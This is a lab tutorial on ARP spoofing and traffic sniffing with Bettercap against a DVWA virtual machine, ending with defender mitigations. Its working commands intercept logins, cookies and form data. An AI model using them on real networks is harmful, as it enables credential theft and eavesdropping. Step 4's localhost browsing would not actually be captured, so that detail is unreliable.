## 🧪 LAB: Spying on Network Devices Using Bettercap + DVWA

### 🔧 LAB TOOLS NEEDED

| Component    | Role              | Recommended OS            |
| ------------ | ----------------- | ------------------------- |
| 🖥 Attacker  | Sniffs/captures   | **Kali Linux**            |
| 🧑‍💻 Victim | Gets ARP spoofed  | **DVWA on Ubuntu**        |
| 🌐 Network   | Shared connection | **NAT Network / Bridged** |

---

## 📦 STEP 1: Setup Virtual Environment

### 🔸 1.1 Kali Linux (Attacker)

* Use VirtualBox or VMware
* Ensure **Bettercap is installed**:

  ```bash
  sudo apt install bettercap
  ```

### 🔸 1.2 DVWA Machine (Victim)

* Ubuntu/Debian-based VM

* Install DVWA:

  ```bash
  sudo apt update && sudo apt install apache2 mariadb-server php php-mysqli git -y
  git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
  sudo chown -R www-data:www-data /var/www/html/dvwa
  ```

* Setup MySQL and configure DVWA:
  Follow [DVWA setup instructions](https://github.com/digininja/DVWA)

### 🔸 1.3 Network Configuration

* Ensure both VMs are on the same subnet:

  * Use **"NAT Network"** or **"Internal Network"** in VirtualBox.
  * Test with ping:

    ```bash
    ping <victim_IP>
    ```

---

## 🧠 STEP 2: Discover Victim IP

On Kali:

```bash
sudo arp-scan --localnet
```

Note the IP of your DVWA victim (e.g., `192.168.56.101`).

---

## 🛠 STEP 3: Perform ARP Spoofing with Bettercap

```bash
sudo bettercap -iface eth0  # or your correct interface
```

Inside Bettercap interactive shell:

```bash
set net.ipv4.forwarding true
set arp.spoof.targets 192.168.56.101
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

---

## 🧪 STEP 4: Browse DVWA on Victim and Trigger Sniff

On your **DVWA machine**:

* Open browser → `http://localhost/dvwa`
* Login with `admin` / `password`
* Use forms like “Brute Force”, “Login”, etc.

---

## 🔍 STEP 5: View Captured Credentials

In your **Bettercap terminal**, you should now see:

```
http login detected: admin:password from 192.168.56.101
```

Bettercap will also show **visited websites**, **cookies**, and **form fields**.

---

## 📁 STEP 6: Optional – Save Logs to PCAP File

```bash
set net.sniff.output /home/kali/sniffed.pcap
```

Then analyze with:

```bash
wireshark /home/kali/sniffed.pcap
```

Apply filters like:

* `http.request.method == "POST"`
* `dns`
* `tcp.port == 80`

---

## 🧹 Cleanup

To stop:

```bash
arp.spoof off
net.sniff off
exit
```

And disable IP forwarding:

```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

## 🔐 Mitigations (for defenders)

* Use HTTPS with HSTS
* Enable static ARP tables on critical devices
* Use switch port security (against ARP flooding)
* Use IDS/IPS to detect ARP spoofing
